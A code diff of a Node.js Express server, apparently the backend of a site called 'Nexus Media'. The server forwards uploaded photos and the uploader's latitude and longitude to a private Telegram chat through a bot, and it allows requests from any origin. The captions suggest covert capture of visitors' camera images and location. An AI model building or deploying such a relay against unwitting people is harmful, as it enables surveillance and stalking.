@@ -1,48 +1,70 @@
-require('dotenv').config();
-const express = require('express');
-const multer = require('multer');
-const axios = require('axios');
-const FormData = require('form-data');
-const fs = require('fs');
-const path = require('path');
+import express from 'express';
+import multer from 'multer';
+import fs from 'fs';
+import fetch from 'node-fetch'; // For Telegram API calls
+import FormData from 'form-data';
 
 const app = express();
-const upload = multer({ dest: path.join(__dirname, 'uploads/') });
+const upload = multer({ dest: 'uploads/' });
 
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-const PORT = process.env.PORT || 3000;
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-if(!BOT_TOKEN || !CHAT_ID) {
-  console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
-  process.exit(1);
-}
+// ✅ Enable JSON and CORS (for frontend calls)
+app.use(express.json());
+app.use((req, res, next) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  next();
+});
 
-app.use(express.static('public'));
-
+// ✅ Upload route
 app.post('/upload', upload.single('file'), async (req, res) => {
-  const filePath = req.file?.path;
-  if(!filePath) return res.status(400).json({ error: 'No file uploaded' });
-
   try {
-    const form = new FormData();
-    form.append('chat_id', CHAT_ID);
-    form.append('photo', fs.createReadStream(filePath));
+    const { latitude, longitude } = req.body;
+    const filePath = req.file?.path;
 
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-    const response = await axios.post(url, form, {
-      headers: form.getHeaders(),
-      maxContentLength: Infinity,
-      maxBodyLength: Infinity
-    });
+    // 1️⃣ Send the captured photo to Telegram
+    if (filePath) {
+      const form = new FormData();
+      form.append('chat_id', TELEGRAM_CHAT_ID);
+      form.append('photo', fs.createReadStream(filePath));
+      form.append('caption', '📸 New photo captured from Nexus Media');
 
-    fs.unlinkSync(filePath);
-    res.json({ ok: true, result: response.data });
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: form,
+      });
+    }
+
+    // 2️⃣ If coordinates exist, send them as a message to the same chat
+    if (latitude && longitude) {
+      const message = `📍 Location: ${latitude}, ${longitude}`;
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+        }),
+      });
+    }
+
+    // 3️⃣ Clean up file
+    if (filePath) fs.unlink(filePath, () => {});
+
+    res.json({ success: true, message: 'Photo and location sent to Telegram' });
   } catch (err) {
-    console.error(err);
-    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
-    res.status(500).json({ error: err.message });
+    console.error('Upload error:', err);
+    res.status(500).json({ error: 'Failed to send to Telegram' });
   }
 });
 
-app.listen(PORT, () => console.log(`🚀 Server running at http://localhost:${PORT}`));
+// Default route
+app.get('/', (req, res) => {
+  res.send('📷 Nexus Media backend running...');
+});
+
+const PORT = process.env.PORT || 10000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
